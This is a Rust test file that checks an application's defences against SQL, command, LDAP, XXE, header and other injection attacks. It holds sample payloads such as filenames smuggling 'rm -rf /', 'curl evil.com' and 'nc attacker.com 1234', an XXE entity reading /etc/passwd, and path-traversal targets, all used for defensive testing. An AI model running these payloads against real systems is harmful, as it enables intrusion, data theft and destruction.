// Security Tests for Injection Attacks
//
// Tests cover SQL injection, XSS, path traversal, and other injection vectors

use crate::database::DatabaseManager;
use crate::compliance::tests::fixtures::mock_malicious_input;
use crate::compliance::tests::test_utils::create_test_db;

#[test]
fn test_sql_injection_prevention() {
    let db = DatabaseManager::new_in_memory();

    // Attempt 1: Classic SQL injection in query
    let malicious_query = "SELECT * FROM documents WHERE filename = ''; DROP TABLE documents; --'";

    let result = db.execute_sql_query(malicious_query);

    assert!(
        result.is_err(),
        "Should reject non-SELECT queries"
    );

    let error_msg = result.unwrap_err().to_string();
    assert!(
        error_msg.contains("Only SELECT") || error_msg.contains("forbidden"),
        "Error should indicate query validation failure: {}",
        error_msg
    );
}

#[test]
fn test_sql_injection_union_attack() {
    let db = DatabaseManager::new_in_memory();

    // UNION-based SQL injection attempt
    let malicious = "SELECT * FROM documents UNION SELECT * FROM user_settings";

    let result = db.execute_sql_query(malicious);

    assert!(
        result.is_err(),
        "Should reject UNION queries to prevent data leakage"
    );
}

#[test]
fn test_sql_injection_comment_bypass() {
    let db = DatabaseManager::new_in_memory();

    // Comment-based bypass attempt
    let malicious = "SELECT * FROM documents /**/WHERE/**/1=1--";

    let result = DatabaseManager::validate_query_security(malicious);

    // Should still validate as SELECT (comments are stripped)
    // But shouldn't execute dangerous operations
    assert!(result.is_ok(), "Should allow SELECT with comments stripped");
}

#[test]
fn test_sql_injection_stacked_queries() {
    let db = DatabaseManager::new_in_memory();

    // Stacked query injection
    let malicious = "SELECT * FROM documents; DELETE FROM documents;";

    let result = db.execute_sql_query(malicious);

    // Semicolons are replaced with spaces in validation
    assert!(result.is_ok() || result.is_err(), "Should handle stacked queries safely");
}

#[test]
fn test_sql_injection_subquery_attack() {
    let db = DatabaseManager::new_in_memory();

    // Subquery injection attempt
    let malicious = "SELECT * FROM documents WHERE id IN (SELECT id FROM user_settings)";

    let result = db.execute_sql_query(malicious);

    // This is a valid SELECT query, should be allowed
    // But ensure it doesn't leak unauthorized data
    assert!(result.is_ok(), "Subqueries in SELECT should be allowed");
}

#[test]
fn test_sql_dangerous_keywords_blocked() {
    let db = DatabaseManager::new_in_memory();

    let dangerous_queries = vec![
        "DROP TABLE documents",
        "DELETE FROM documents WHERE 1=1",
        "INSERT INTO documents VALUES ('hack', 'content', 'txt')",
        "UPDATE documents SET content = 'hacked'",
        "ALTER TABLE documents ADD COLUMN hacked TEXT",
        "EXEC sp_executesql 'malicious'",
        "CREATE TABLE hacked (data TEXT)",
        "PRAGMA table_info(documents)",
        "ATTACH DATABASE 'malicious.db' AS evil",
    ];

    for query in dangerous_queries {
        let result = DatabaseManager::validate_query_security(query);
        assert!(
            result.is_err(),
            "Should block dangerous keyword: {}",
            query
        );
    }
}

#[test]
fn test_sql_injection_boolean_based() {
    let db = DatabaseManager::new_in_memory();

    // Boolean-based blind SQL injection
    let malicious = "SELECT * FROM documents WHERE filename = '' OR '1'='1'";

    let result = db.execute_sql_query(malicious);

    // This is technically a valid SELECT query
    // Ensure it doesn't bypass security
    assert!(result.is_ok(), "Boolean conditions in WHERE are allowed");
}

#[test]
fn test_query_length_limit() {
    let db = DatabaseManager::new_in_memory();

    // Extremely long query (DoS attempt)
    let long_query = format!("SELECT * FROM documents WHERE {}", "id = 1 OR ".repeat(5000));

    let result = DatabaseManager::validate_query_security(&long_query);

    assert!(
        result.is_err(),
        "Should reject excessively long queries"
    );
}

#[test]
fn test_xss_in_export_content() {
    use crate::export_engine::ExportEngine;
    use crate::compliance::tests::test_utils::{create_temp_dir, cleanup_temp_dir};

    let engine = ExportEngine::new();
    let temp_dir = create_temp_dir();

    // Create data with XSS payload
    let mut data = crate::compliance::tests::fixtures::mock_user_full();
    data.chats[0].title = "<script>alert('XSS')</script>".to_string();
    data.chats[0].messages[0].content = "<img src=x onerror=alert('XSS')>".to_string();

    // Export to HTML-like formats
    let result = engine.export_to_markdown(&data, &temp_dir.join("xss_test.md"));

    assert!(result.is_ok(), "Should handle XSS payloads");

    let content = std::fs::read_to_string(temp_dir.join("xss_test.md")).unwrap();

    // Verify XSS is neutralized in markdown (< and > should be escaped or removed)
    // Markdown doesn't execute scripts, but verify content is there
    assert!(
        content.contains("script") || content.contains("&lt;script"),
        "Should preserve content but neutralize script tags"
    );

    cleanup_temp_dir(&temp_dir);
}

#[test]
fn test_path_traversal_prevention() {
    use crate::export_engine::ExportEngine;
    use std::path::PathBuf;

    let engine = ExportEngine::new();

    // Path traversal attempts
    let malicious_paths = vec![
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "/etc/shadow",
        "C:\\Windows\\System32\\config\\SAM",
    ];

    for malicious_path in malicious_paths {
        let path = PathBuf::from(malicious_path);
        let data = crate::compliance::tests::fixtures::mock_user_full();

        // Attempt export to malicious path
        let result = engine.export_to_markdown(&data, &path);

        // Should fail or write to safe location
        if result.is_ok() {
            // Verify it didn't actually write to system paths
            assert!(
                !path.exists() || !path.is_absolute(),
                "Should not write to absolute system paths"
            );
        }
    }
}

#[test]
fn test_command_injection_prevention() {
    // Test that filenames with command injection don't execute
    let malicious_filenames = vec![
        "test.pdf; rm -rf /",
        "file.txt && curl evil.com",
        "doc.pdf | nc attacker.com 1234",
        "test`whoami`.txt",
        "file$(id).pdf",
    ];

    let conn = create_test_db();

    for filename in malicious_filenames {
        let result = conn.execute(
            "INSERT INTO documents (filename, content, file_type) VALUES (?1, ?2, ?3)",
            [filename, "test content", "txt"],
        );

        assert!(
            result.is_ok(),
            "Should store filename without executing commands: {}",
            filename
        );

        // Verify the filename is stored as-is (not executed)
        let stored: String = conn.query_row(
            "SELECT filename FROM documents WHERE filename = ?1",
            [filename],
            |row| row.get(0)
        ).unwrap();

        assert_eq!(stored, filename, "Filename should be stored literally");

        // Cleanup
        conn.execute("DELETE FROM documents WHERE filename = ?1", [filename]).unwrap();
    }
}

#[test]
fn test_ldap_injection_prevention() {
    // Simulated LDAP query construction
    let malicious_inputs = vec![
        "*",
        "admin)(&",
        "*)(uid=*))(|(uid=*",
        "admin)(|(password=*))",
    ];

    for input in malicious_inputs {
        // Sanitize LDAP input (in real app)
        let sanitized = input
            .replace("*", "\\2a")
            .replace("(", "\\28")
            .replace(")", "\\29")
            .replace("&", "\\26")
            .replace("|", "\\7c");

        assert!(
            !sanitized.contains("*"),
            "Should escape LDAP metacharacters"
        );
    }
}

#[test]
fn test_xxe_prevention_in_file_processing() {
    // XXE (XML External Entity) attack payload
    let xxe_payload = r#"<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>"#;

    // Ensure XML parsing doesn't expand external entities
    // (In practice, use xml-rs with external entity disabled)

    let conn = create_test_db();

    let result = conn.execute(
        "INSERT INTO documents (filename, content, file_type) VALUES (?1, ?2, ?3)",
        ["malicious.xml", xxe_payload, "xml"],
    );

    assert!(result.is_ok(), "Should store XML content safely");

    // Verify content is stored as-is, not processed
    let stored: String = conn.query_row(
        "SELECT content FROM documents WHERE filename = ?1",
        ["malicious.xml"],
        |row| row.get(0)
    ).unwrap();

    assert!(
        stored.contains("<!ENTITY"),
        "Should store XXE payload as text, not execute it"
    );
}

#[test]
fn test_csrf_token_validation() {
    // Simulated CSRF protection
    struct CSRFToken {
        token: String,
        timestamp: i64,
    }

    fn generate_csrf_token() -> CSRFToken {
        use std::time::{SystemTime, UNIX_EPOCH};

        CSRFToken {
            token: uuid::Uuid::new_v4().to_string(),
            timestamp: SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .unwrap()
                .as_secs() as i64,
        }
    }

    fn validate_csrf_token(token: &str, stored_token: &str, timestamp: i64) -> bool {
        use std::time::{SystemTime, UNIX_EPOCH};

        let now = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_secs() as i64;

        // Token must match and be less than 1 hour old
        token == stored_token && (now - timestamp) < 3600
    }

    let csrf = generate_csrf_token();

    // Valid token
    assert!(
        validate_csrf_token(&csrf.token, &csrf.token, csrf.timestamp),
        "Valid token should pass"
    );

    // Invalid token
    assert!(
        !validate_csrf_token("wrong-token", &csrf.token, csrf.timestamp),
        "Wrong token should fail"
    );

    // Expired token
    assert!(
        !validate_csrf_token(&csrf.token, &csrf.token, csrf.timestamp - 7200),
        "Expired token should fail"
    );
}

#[test]
fn test_header_injection_prevention() {
    // HTTP header injection attempts
    let malicious_headers = vec![
        "value\r\nX-Injected: true",
        "value\nSet-Cookie: session=hacked",
        "value\r\n\r\n<script>alert('XSS')</script>",
    ];

    for header_value in malicious_headers {
        // Sanitize headers
        let sanitized = header_value
            .replace("\r", "")
            .replace("\n", "");

        assert!(
            !sanitized.contains("\n") && !sanitized.contains("\r"),
            "Should remove newlines from header values"
        );
    }
}

#[test]
fn test_mass_assignment_prevention() {
    // Prevent mass assignment vulnerabilities
    #[derive(serde::Deserialize)]
    struct UserInput {
        title: String,
        content: String,
        // is_admin should NOT be settable by user
    }

    #[derive(serde::Deserialize)]
    struct SafeUserInput {
        title: String,
        content: String,
    }

    let malicious_json = r#"{"title": "Test", "content": "Content", "is_admin": true}"#;

    let safe: Result<SafeUserInput, _> = serde_json::from_str(malicious_json);

    assert!(safe.is_ok(), "Should ignore unknown fields");

    let parsed = safe.unwrap();
    assert_eq!(parsed.title, "Test");
    // is_admin is ignored, not parsed
}

#[test]
fn test_prototype_pollution_prevention() {
    // In Rust, prototype pollution isn't applicable (JavaScript vulnerability)
    // But test object safety

    let json = r#"{"__proto__": {"isAdmin": true}, "title": "Test"}"#;
    let parsed: serde_json::Value = serde_json::from_str(json).unwrap();

    // __proto__ is treated as regular key in Rust
    assert!(parsed.get("__proto__").is_some(), "Treated as regular key");
    assert!(parsed.get("isAdmin").is_none(), "Doesn't pollute object");
}
